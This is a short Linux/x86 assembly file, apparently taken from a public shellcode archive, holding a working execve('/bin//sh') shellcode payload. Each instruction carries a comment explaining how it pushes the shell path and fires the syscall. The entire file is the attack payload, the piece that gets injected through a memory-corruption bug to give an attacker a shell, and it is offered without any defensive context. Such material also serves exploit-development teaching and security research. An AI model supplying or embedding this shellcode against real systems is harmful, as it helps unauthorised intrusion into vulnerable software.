; Linux/x86 - execve /bin/sh shellcode
; http://shell-storm.org/shellcode/files/shellcode-827.php

global _start

section .text

	_start:
		
	   	xor    eax,eax		; eax=NULL
    	   	push   eax		
    		push   0x68732f2f	; hs//	
    		push   0x6e69622f	; nib/
		mov    ebx,esp		; /bin//sh null terminated
		push   eax			
		push   ebx
		mov    ecx,esp		; envp
		mov    al,0xb		; execve syscall
		int    0x80		; informs kernel for execution
